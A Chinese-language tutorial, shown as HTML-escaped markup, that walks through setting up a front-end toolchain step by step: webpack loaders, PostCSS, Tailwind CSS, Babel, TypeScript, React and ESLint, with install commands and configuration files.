&lt;p&gt;💡 &lt;strong&gt;Webpack 中的 loader 与 plugin：&lt;/strong&gt;二者都是可以集成到 webpack 的模块，但是两个不同的概念。loader 一般用于处理特定类型的文件，而 plugin 可以提供更加广泛的功能。&lt;/p&gt;
&lt;p&gt;比如，为了引入 CSS 文件，可以安装 &lt;strong&gt;style-loader&lt;/strong&gt; 和 &lt;strong&gt;css-loader&lt;/strong&gt; 两个模块（&lt;a href=&quot;https://webpack.js.org/guides/asset-management/#loading-css&quot;&gt;相关文档&lt;/a&gt;）：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm i style-loader css-loader --save-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来，修改 webpack 配置文件，添加一条规则：对于文件名以 &lt;code&gt;.css&lt;/code&gt; 结尾的文件，使用这两个模块：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// webpack.config.js
// ...
module.exports = {
  // ...
  module: {
    rules: [
      {
        test: /\.css$/i,
        use: [&apos;style-loader&apos;, &apos;css-loader&apos;],
      },
    ],
  },
 };
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Webpack 会按照配置的顺序调用 loader。在该配置文件下，先调用 style-loader，再调用 css-loader。这两个 loader 分别的作用是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;style-loader&lt;/strong&gt;：将一个 CSS 文件注入 DOM，放在 &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt; 元素中。（&lt;a href=&quot;https://webpack.js.org/loaders/style-loader/&quot;&gt;文档&lt;/a&gt;）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;css-loader&lt;/strong&gt;：解析 CSS 中的 &lt;code&gt;@import&lt;/code&gt; 和 &lt;code&gt;url()&lt;/code&gt; 等语句，将对应引用的文件配置好。（&lt;a href=&quot;https://webpack.js.org/loaders/css-loader&quot;&gt;文档&lt;/a&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;现在，可以使用 import 语句导入 CSS 文件了。首先还是在根目录下编写 &lt;code&gt;style.css&lt;/code&gt; 文件：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-css&quot;&gt;// style.css
.bg-gray {
  background-color: #aaa;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;保存后，修改 &lt;code&gt;index.js&lt;/code&gt; 文件：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// index.js
import moment from &amp;quot;moment&amp;quot;;
import &amp;quot;./style.css&amp;quot;;

const app = document.getElementById(&amp;quot;app&amp;quot;);
app.innerText = moment().format();

app.classList.add(&amp;quot;bg-gray&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;重新 build 后，打开 HTML 即可发现样式的变化。&lt;/p&gt;
&lt;h2&gt;PostCSS&lt;/h2&gt;
&lt;p&gt;顾名思义。&lt;strong&gt;PostCSS&lt;/strong&gt; 能够对 CSS 文件进行「后处理」（post-processing）。&lt;/p&gt;
&lt;p&gt;和之前提到的 style-loader 和 css-loader 一样，PostCSS 也可以作为 loader 集成到 webpack。&lt;/p&gt;
&lt;h3&gt;集成到 webpack&lt;/h3&gt;
&lt;p&gt;首先还是安装 &lt;strong&gt;postcss-loader&lt;/strong&gt;，同时安装 PostCSS 的一个插件 &lt;strong&gt;autoprefixer&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm i postcss-loader autoprefixer --save-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 &lt;code&gt;webpack.config.js&lt;/code&gt; 中添加配置：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// webpack.config.js
// ...
module.exports = {
  // ...
  module: {
    rules: [
      {
        test: /\.css$/i,
        use: [
          &amp;quot;style-loader&amp;quot;,
          {
            loader: &amp;quot;css-loader&amp;quot;,
            options: {
              importLoaders: 1,
            },
          },
          &amp;quot;postcss-loader&amp;quot;,
        ],
      },
    ],
  },
  // ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;⚠️ &lt;strong&gt;注意：&lt;/strong&gt;此处调用 css-loader 处添加了 options，将 &lt;strong&gt;importLoaders&lt;/strong&gt; 设置为 1。这是考虑到 PostCSS 可能引入新的 &lt;code&gt;@import&lt;/code&gt; 等语句，css-loader 要在其运行之后重新进行解析（&lt;a href=&quot;https://webpack.js.org/loaders/css-loader/#importloaders&quot;&gt;相关文档&lt;/a&gt;）。如果确定 PostCSS 不会添加新的 &lt;code&gt;@import&lt;/code&gt; 等语句，则此参数可不加。（可参考 &lt;a href=&quot;https://github.com/webpack-contrib/css-loader/issues/228#issuecomment-312885975&quot;&gt;GitHub 上的相关讨论&lt;/a&gt;）&lt;/p&gt;
&lt;h3&gt;配置文件 postcss.config.js&lt;/h3&gt;
&lt;p&gt;接下来创建 PostCSS 的配置文件，项目根目录下的 &lt;code&gt;postcss.config.js&lt;/code&gt; 文件（&lt;a href=&quot;https://github.com/postcss/postcss?tab=readme-ov-file#webpack&quot;&gt;文档&lt;/a&gt;）：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// postcss.config.js
/** @type {import(&apos;postcss-load-config&apos;).Config} */
module.exports = {
  plugins: [require(&amp;quot;autoprefixer&amp;quot;)],
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在以上的配置文件中，我们加载了 PostCSS 的 &lt;strong&gt;autoprefixer&lt;/strong&gt; 插件（&lt;a href=&quot;https://github.com/postcss/autoprefixer&quot;&gt;文档&lt;/a&gt;）。由于浏览器支持的差异，部分浏览器中使用某些样式需要加上特定的前缀，比如 &lt;code&gt;webkit&lt;/code&gt; 或者 &lt;code&gt;moz&lt;/code&gt;，这叫做 &lt;strong&gt;vendor prefix&lt;/strong&gt;。这个插件会自动添加这种前缀，确保样式的兼容性。这里使用此插件只是为了演示 PostCSS 插件的使用，因为接下来我们将配置使用 Tailwind 插件。&lt;/p&gt;
&lt;p&gt;PostCSS 是 webpack 的插件，autoprefixer 又是 PostCSS 的插件，也就是 webpack 的插件的插件。接下来我们还可以安装 Tailwind 的插件，即 webpack 的插件的插件的插件。&lt;strong&gt;前端工具链就是如此。&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Tailwind CSS&lt;/h2&gt;
&lt;p&gt;使用过 Tailwind 之后，在开发任何前端项目时，我的心理状态：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;没有它我不能活！😭😭😭&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;是的，之后在开发任何前端项目的时候，我&lt;strong&gt;没有一次&lt;/strong&gt;离开过 Tailwind。即使是写纯 HTML 也要从 CDN 引入静态文件。因为它彻底改变了我们编写样式的方式。&lt;/p&gt;
&lt;p&gt;作为现代前端项目，Tailwind 当然是必备的工具。&lt;/p&gt;
&lt;h3&gt;集成到 PostCSS&lt;/h3&gt;
&lt;p&gt;首先还是安装 Tailwind：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install tailwindcss --save-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来，在 PostCSS 中添加 Tailwind 插件（&lt;a href=&quot;https://tailwindcss.com/docs/installation/using-postcss&quot;&gt;官方指南&lt;/a&gt;）：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// postcss.config.js
/** @type {import(&apos;postcss-load-config&apos;).Config} */
module.exports = {
  plugins: {
    tailwindcss: {},
    autoprefixer: {},
  }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;配置文件 tailwind.config.js&lt;/h3&gt;
&lt;p&gt;下一步，使用以下命令创建 Tailwind 的配置文件：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npx tailwindcss init
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Tailwind 会生成自己的配置文件 &lt;code&gt;tailwind.config.js&lt;/code&gt;（&lt;a href=&quot;https://tailwindcss.com/docs/configuration&quot;&gt;文档&lt;/a&gt;）：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// tailwind.config.js
/** @type {import(&apos;tailwindcss&apos;).Config} */
module.exports = {
  content: [&amp;quot;./**/*.{html,js}&amp;quot;],
  theme: {
    extend: {},
  },
  plugins: [],
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;配置文件中的 &lt;strong&gt;content&lt;/strong&gt; 的值，是一个字符串数组，其中存放着需要处理的文件路径。Tailwind 会尝试检测所有匹配的文件中出现的 class 值，并添加对应的 CSS 定义。&lt;/p&gt;
&lt;p&gt;为了匹配我们根目录下的模板 HTML 和 js 文件，删除路径中 &lt;code&gt;src&lt;/code&gt; 部分。（或者也可以将所有源文件放到 &lt;code&gt;src&lt;/code&gt; 子目录里——大多数项目都是这样做的。下一步在整理文件环节，我们也会这样做）。&lt;/p&gt;
&lt;p&gt;接下来，在我们引用的主样式表（即 &lt;code&gt;style.css&lt;/code&gt;）的开头，&lt;strong&gt;加上 &lt;code&gt;@tailwind&lt;/code&gt; 指令&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-css&quot;&gt;// style.css
@tailwind base;
@tailwind components;
@tailwind utilities;

.bg-gray {
    background-color: #aaaaaa;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;大功告成。接下来可以尝试修改 HTML 模板并重新 build，就可以发现能使用 Tailwind 了！&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;html&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;div class=&amp;quot;text-4xl&amp;quot; id=&amp;quot;app&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（当然，集成到 PostCSS 并不是使用 Tailwind 的唯一方式。官方的&lt;a href=&quot;https://tailwindcss.com/docs/installation&quot;&gt;Get started&lt;/a&gt; 中提供了大量框架、工具的集成指南）&lt;/p&gt;
&lt;h3&gt;安装 Tailwind 插件&lt;/h3&gt;
&lt;p&gt;没错，Tailwind 也有插件生态，比如 &lt;strong&gt;tailwindcss-animated&lt;/strong&gt;（&lt;a href=&quot;https://www.tailwindcss-animated.com&quot;&gt;文档&lt;/a&gt;）和 &lt;strong&gt;typography&lt;/strong&gt;（&lt;a href=&quot;https://github.com/tailwindlabs/tailwindcss-typography&quot;&gt;文档&lt;/a&gt;），这两个插件我都比较常用。&lt;/p&gt;
&lt;p&gt;Tailwind 插件配置起来并不难，这里不再展开了，可以查阅相关文档。&lt;/p&gt;
&lt;h2&gt;中场休息：整理目录结构&lt;/h2&gt;
&lt;p&gt;至此，CSS 相关的工具配置完了。在进行下一步之前，是时候整理一下我们项目的目录结构了。&lt;/p&gt;
&lt;p&gt;如前文所述，为了让项目目录更简洁，&lt;strong&gt;我们将所有源文件移动到新建的 &lt;code&gt;src&lt;/code&gt; 文件夹内。&lt;/strong&gt;移动之后，项目目录结构如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;node_modules/
  ...
dist/
  ...
src/
  template.html
  index.js
  style.css
package-lock.json
package.json
postcss.config.js
tailwind.config.js
webpack.config.js
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;为了使所有工具只处理 &lt;code&gt;src&lt;/code&gt; 目录下的文件，需要修改部分配置文件。&lt;/p&gt;
&lt;p&gt;修改 &lt;code&gt;tailwind.config.js&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// tailwind.config.js
module.exports = {
  content: [&amp;quot;./src/**/*.{html,js}&amp;quot;],
  // ...
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改 &lt;code&gt;webpack.config.js&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// webpack.config.js
module.exports = {
  // ...
  entry: &amp;quot;./src/index.js&amp;quot;,
  // ...
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这下，我们的项目目录就干净了很多。是时候进行下一步了！&lt;/p&gt;
&lt;h2&gt;Babel&lt;/h2&gt;
&lt;p&gt;JavaScript 是浏览器原生支持的唯一语言，但：1）不同浏览器对该语言的新特性支持有所不同；2）许多人不喜欢 JavaScript 弱类型的特性，TypeScript 应运而生。但浏览器本身不支持 TypeScript。&lt;/p&gt;
&lt;p&gt;所以，需要这样一种工具：1）将 JavaScript 的新特性相关代码转换为使用旧特性的实现；2）将 TypeScript 翻译为 JavaScript。这个过程和 C++ 这类语言「编译」的过程有些相似，只是目标是 JavaScript 而非二进制。&lt;/p&gt;
&lt;p&gt;这种工具就叫做 &lt;strong&gt;transpiler&lt;/strong&gt;（可以翻译成「转译器」）。它的作用是将一段代码「翻译」成另一段代码，但目标代码仍然是高级语言（一般是 JavaScript）。这个「翻译」和传统编程语言中的「Compile」概念不同，称为「&lt;strong&gt;Transpile&lt;/strong&gt;」。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Babel&lt;/strong&gt; 就是其中之一。&lt;/p&gt;
&lt;p&gt;（吐槽：既然都要 transpile 才能运行代码，不如直接 compile 成更低级的字节码，执行效率还会更高。&lt;strong&gt;Web Assembly&lt;/strong&gt; 就这样诞生了。不过这里不介绍了）&lt;/p&gt;
&lt;h3&gt;集成到 webpack&lt;/h3&gt;
&lt;p&gt;Babel 可以和 PostCSS 一样&lt;strong&gt;作为 loader 集成在 webpack 里&lt;/strong&gt;。安装 Babel：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm i babel-loader @babel/core --save-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;安装后，修改 webpack 配置文件，对 .js 文件使用 &lt;strong&gt;babel-loader&lt;/strong&gt;（排除 &lt;code&gt;node_modules&lt;/code&gt; 目录中的文件）：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// webpack.config.js
module.exports = {
  // ...
  module: {
    rules: [
      // ...
      {
        test: /\.js$/,
        exclude: /node_modules/,
        use: {
          loader: &amp;quot;babel-loader&amp;quot;,
        },
      },
    ],
  },
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（同样，集成到 webpack 也非安装 Babel 的唯一方式。&lt;a href=&quot;https://babeljs.io/setup#installation&quot;&gt;官方指南&lt;/a&gt;提供了很多种配置方式）&lt;/p&gt;
&lt;p&gt;目前，重新 build 时，虽然会调用 babel-loader，但是 Babel 还什么事情都没做。这是因为我们没有为其指定任何规则。一般可以通过 &lt;strong&gt;preset&lt;/strong&gt; 指定规则。&lt;/p&gt;
&lt;h3&gt;presets&lt;/h3&gt;
&lt;p&gt;Babel 中的 &lt;strong&gt;preset&lt;/strong&gt; 这一概念，官方的定义是「可分享的一组插件和配置的集合」（&lt;a href=&quot;https://babeljs.io/docs/presets&quot;&gt;文档&lt;/a&gt;）。&lt;/p&gt;
&lt;p&gt;官方提供了四种 preset：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;env&lt;/strong&gt;：用于将较新的 ECMAScript 特性转译为兼容较旧环境的实现。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;react&lt;/strong&gt;：用于转译 React.js 的 JSX 语法。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;typescript&lt;/strong&gt;：用于转译 TypeScript。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;flow&lt;/strong&gt;：用于 &lt;a href=&quot;https://flow.org/&quot;&gt;flow&lt;/a&gt; 工具，这是一个静态类型检查器。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;配置文件 babel.config.json&lt;/h3&gt;
&lt;p&gt;在项目根目录下创建配置文件 &lt;code&gt;babel.config.json&lt;/code&gt;，其中可以添加 preset 指定规则。我们先添加一个 preser-env：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;// babel.config.json
{
  &amp;quot;presets&amp;quot;: [&amp;quot;@babel/preset-env&amp;quot;]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;别忘了安装这个 preset：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm i @babel/preset-env --save-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;安装和配置完毕后，重新 build，就会使用 preset-env 指定的 transpile 规则。这套规则有什么用呢？&lt;/p&gt;
&lt;h3&gt;preset-env&lt;/h3&gt;
&lt;p&gt;ECMAScript 标准每一两年都推出新的版本，引入新的特性。而不同浏览器对其的实现难免会有所滞后。为了：1）能及时使用 ECMAScript 的新特性；2）确保我们的代码在所有浏览器环境中的表现一致，&lt;strong&gt;Babel 提供的 preset-env 可以将使用新特性的代码 transpile 为使用旧特性的实现。&lt;/strong&gt;（&lt;a href=&quot;https://babeljs.io/docs/babel-preset-env&quot;&gt;文档&lt;/a&gt;）（在 Babel 出现之前，许多应用引入一个静态的 js 脚本完成这一功能，这种脚本叫做「polyfill」）&lt;/p&gt;
&lt;p&gt;比如，ES6 引入了箭头函数和 const 关键字：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;const a = [1,2,3];
a.forEach((x) =&amp;gt; console.log(x));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果要兼容不支持 ES6 的环境（虽然所有现代浏览器都已经支持了 ES6），Babel 就要将箭头函数转换成普通函数，const 换成 var：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var a = [1, 2, 3];
a.forEach(function (x) {
  return console.log(x);
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以在官网的 &lt;a href=&quot;https://babeljs.io/repl&quot;&gt;Try it out&lt;/a&gt; 中尝试。&lt;/p&gt;
&lt;h2&gt;TypeScript&lt;/h2&gt;
&lt;p&gt;TypeScript 也是开发现代 Web 应用的必备。如果 standalone 地安装，可以使用 &lt;code&gt;tsc&lt;/code&gt; 命令将一个 .ts 文件 transpile 成一个 .js 文件。然而，为了使这一过程在 build 时自动完成，还是要将其集成到 Babel。&lt;/p&gt;
&lt;h3&gt;集成到 Babel&lt;/h3&gt;
&lt;p&gt;如前所述，Babel 已经提供了 TypeScript 的 preset（&lt;a href=&quot;https://babeljs.io/docs/babel-preset-typescript&quot;&gt;文档&lt;/a&gt;），其中包含了转译 TypeScript 的插件。只需直接安装：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm i @babel/preset-typescript --save-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 &lt;code&gt;webpack.config.js&lt;/code&gt; 中，要修改两个地方：1）将 entry 改为 &lt;code&gt;index.ts&lt;/code&gt;；2）将 babel-loader 的 test 规则改为匹配 .ts 结尾的文件：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// webpack.config.js
module.exports = {
  // ...
  entry: &amp;quot;./src/index.ts&amp;quot;,
  // ...
  module: {
    rules: [
      // ...
      {
        test: /\.ts$/,
        exclude: /node_modules/,
        use: {
          loader: &amp;quot;babel-loader&amp;quot;,
        },
      },
    ],
  },
};

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 &lt;code&gt;babel.config.json&lt;/code&gt; 里，加入 &lt;strong&gt;preset-typescript&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;// babel.config.json
{
  &amp;quot;presets&amp;quot;: [
    &amp;quot;@babel/preset-env&amp;quot;,
    &amp;quot;@babel/preset-typescript&amp;quot;
  ]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;现在，可以将 &lt;code&gt;src&lt;/code&gt; 中的 &lt;code&gt;index.js&lt;/code&gt; 改写为 &lt;code&gt;index.ts&lt;/code&gt; 了。由于这段代码很短，只需要改一个地方，即判断 &lt;code&gt;app&lt;/code&gt; 是否为 &lt;code&gt;null&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-ts&quot;&gt;import moment from &amp;quot;moment&amp;quot;;
import &amp;quot;./style.css&amp;quot;;

const app = document.getElementById(&amp;quot;app&amp;quot;);
if (app !== null) {
  app.innerText = moment().format();
  app.classList.add(&amp;quot;bg-gray&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;配置文件 tsconfig.json&lt;/h3&gt;
&lt;p&gt;TypeScript 也有配置文件。在项目根目录下创建 &lt;code&gt;tsconfig.json&lt;/code&gt; 即可。&lt;/p&gt;
&lt;p&gt;具体规则可参考&lt;a href=&quot;https://www.typescriptlang.org/docs/handbook/tsconfig-json.html&quot;&gt;官方文档&lt;/a&gt;。当我们配置好 React 后会再来修改 TypeScript 的规则配置。&lt;/p&gt;
&lt;h2&gt;React.js&lt;/h2&gt;
&lt;p&gt;使用 React 时我们会编写 &lt;strong&gt;JSX&lt;/strong&gt;（或 TSX）语法的代码。JSX（或 TSX）全称 JavaScript（TypeScript）Extension，这是一种糅合了 HTML 和 JavaScript（TypeScript）语法的代码。当然，无论是浏览器还是 Node 都不支持这种代码，&lt;strong&gt;所以需要 Babel 为我们转译&lt;/strong&gt;。其实，这样的代码中，类似 HTML 的那部分会被转译成 JavaScript 递归的函数调用的形式。&lt;/p&gt;
&lt;h3&gt;集成到 Babel&lt;/h3&gt;
&lt;p&gt;Babel 也提供了 React 的 preset（&lt;a href=&quot;https://babeljs.io/docs/babel-preset-react&quot;&gt;文档&lt;/a&gt;），包含了对应插件。只要安装：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm i @babel/preset-react --save-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 &lt;code&gt;webpack.config.js&lt;/code&gt; 中设置匹配 .ts 或 .tsx 结尾的文件：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// webpack.config.js
module.exports = {
  // ...
  module: {
    rules: [
      // ...
      {
        test: /\.tsx?$/,
        exclude: /node_modules/,
        use: {
          loader: &amp;quot;babel-loader&amp;quot;,
        },
      },
    ],
  },
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改 Babel 配置文件 &lt;code&gt;babel.config.json&lt;/code&gt;，添加 &lt;strong&gt;preset-react&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;// babel.config.json
{
  &amp;quot;presets&amp;quot;: [
    &amp;quot;@babel/preset-env&amp;quot;,
    &amp;quot;@babel/preset-react&amp;quot;,
    &amp;quot;@babel/preset-typescript&amp;quot;
  ]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来，为了让 TypeScript 解释 TSX 语法，要在 &lt;code&gt;tsconfig.json&lt;/code&gt; 中加入如下配置：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;// tsconfig.json
{
  &amp;quot;compilerOptions&amp;quot;: {
    &amp;quot;strict&amp;quot;: true,
    &amp;quot;jsx&amp;quot;: &amp;quot;react&amp;quot;,
    &amp;quot;esModuleInterop&amp;quot;: true,
    &amp;quot;noEmit&amp;quot;: true,
    &amp;quot;allowImportingTsExtensions&amp;quot;: true
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这段配置文件中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;strict&lt;/strong&gt; 设为 true 表示开启严格类型检查，包括不允许隐式 any 类型等等。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;jsx&lt;/strong&gt; 设为 react，表示启用 JSX 支持。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;esModuleInterop&lt;/strong&gt; 设为 true 允许用 import 语法直接导入 CommonJS 模块（否则，必须使用 require 的语法）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;noEmit&lt;/strong&gt; 表示不输出编译后的结果文件。由于在该配置中 TypeScript 是作为 Babel 的一个插件，转译后结果文件由 Babel 输出。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;allowImportingTsExtensions&lt;/strong&gt; 表示允许导入 .tsx 类型的文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以及，现在我们的脚本文件可以是 js、jsx、ts、tsx 格式了，要在 Tailwind 的配置文件中修改其检测的文件格式：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// tailwind.config.js
/** @type {import(&apos;tailwindcss&apos;).Config} */
module.exports = {
  content: [&amp;quot;./src/**/*.{html,js,jsx,ts,tsx}&amp;quot;],
  theme: {
    extend: {},
  },
  plugins: [],
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后，别忘了安装 &lt;strong&gt;React 本体&lt;/strong&gt;，以及其对应的类型定义：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm i react react-dom --save
npm i @types/react @types/react-dom --save-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;编写 React 组件&lt;/h3&gt;
&lt;p&gt;现在，在 &lt;code&gt;src&lt;/code&gt; 下创建 &lt;code&gt;App.tsx&lt;/code&gt; 文件，我们可以在其中用 TSX 语法编写一个 React 组件了。&lt;/p&gt;
&lt;p&gt;将之前写的显示时间的组件写进这里面：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-tsx&quot;&gt;// App.tsx
import React from &amp;quot;react&amp;quot;;
import &amp;quot;./style.css&amp;quot;;
import moment from &amp;quot;moment&amp;quot;;

export default function App() {
  return (
    &amp;lt;div className=&amp;quot;App&amp;quot;&amp;gt;
      &amp;lt;h1 className=&amp;quot;text-4xl&amp;quot;&amp;gt;Hello, World!&amp;lt;/h1&amp;gt;
      &amp;lt;p&amp;gt;{moment().format()}&amp;lt;/p&amp;gt;
    &amp;lt;/div&amp;gt;
  );
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;为了引用该组件，入口文件 &lt;code&gt;index.ts&lt;/code&gt; 也需要用到 TSX 语法。因此，将其重命名为 &lt;code&gt;index.tsx&lt;/code&gt;，修改为如下内容：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-tsx&quot;&gt;// index.tsx
import React from &amp;quot;react&amp;quot;;
import { createRoot } from &amp;quot;react-dom/client&amp;quot;;

import App from &amp;quot;./App.tsx&amp;quot;;

const container = document.getElementById(&amp;quot;app&amp;quot;);
if (container !== null) {
  const root = createRoot(container);
  root.render(&amp;lt;App /&amp;gt;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同时，要在 webpack 配置中修改 entry：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// webpack.config.js
module.exports = {
  // ...
  entry: &amp;quot;./src/index.tsx&amp;quot;,
  // ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;现在，build 之后，打开生成的 HTML，可以看到我们用 React 写的组件了。&lt;/p&gt;
&lt;h2&gt;ESLint&lt;/h2&gt;
&lt;p&gt;ESLint 是一个代码检查工具。对于团队项目，统一代码风格十分重要，而 ESLint 可以方便地做到这一点：如果没有满足指定的代码风格，则显示警告或错误（如果在 IDE 中集成的话），或者拒绝提交或部署（如果在提交部署流程中集成的话）。&lt;/p&gt;
&lt;p&gt;为了使流程更加清晰，我们还是选择&lt;strong&gt;将 ESLint 作为一个插件集成到 webpack&lt;/strong&gt;。&lt;/p&gt;
&lt;h3&gt;集成到 webpack&lt;/h3&gt;
&lt;p&gt;安装 &lt;strong&gt;eslint-webpack-plugin&lt;/strong&gt;（&lt;a href=&quot;https://www.npmjs.com/package/eslint-webpack-plugin&quot;&gt;相关文档&lt;/a&gt;）：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm i eslint-webpack-plugin --save-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改 webpack 的配置，添加该插件：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// webpack.config.js
// ...
const ESLintPlugin = require(&apos;eslint-webpack-plugin&apos;);
module.exports = {
  // ...
  plugins: [
    // ...
    new ESLintPlugin({
      extensions: [&amp;quot;js&amp;quot;, &amp;quot;jsx&amp;quot;, &amp;quot;ts&amp;quot;, &amp;quot;tsx&amp;quot;],
    }),
  ],
  // ...
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;配置文件中 &lt;code&gt;new ESLintPlugin({})&lt;/code&gt; 可以传入一个 options 对象，用于指定 &lt;strong&gt;ESLint 插件选项&lt;/strong&gt;（&lt;a href=&quot;https://www.npmjs.com/package/eslint-webpack-plugin&quot;&gt;文档&lt;/a&gt;）。这里我们指定了要 lint 的文件拓展名。&lt;/p&gt;
&lt;h3&gt;配置文件 .eslintrc.js&lt;/h3&gt;
&lt;p&gt;可以使用 &lt;code&gt;@eslint/config&lt;/code&gt; 创建配置文件（&lt;a href=&quot;https://eslint.org/docs/latest/use/getting-started&quot;&gt;文档&lt;/a&gt;），这是一个友好的交互式命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm init @eslint/config
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在其中可以选择「项目使用了 React.js、TypeScript」，该命令会自动为我们安装配置对应的 ESLint 插件。&lt;/p&gt;
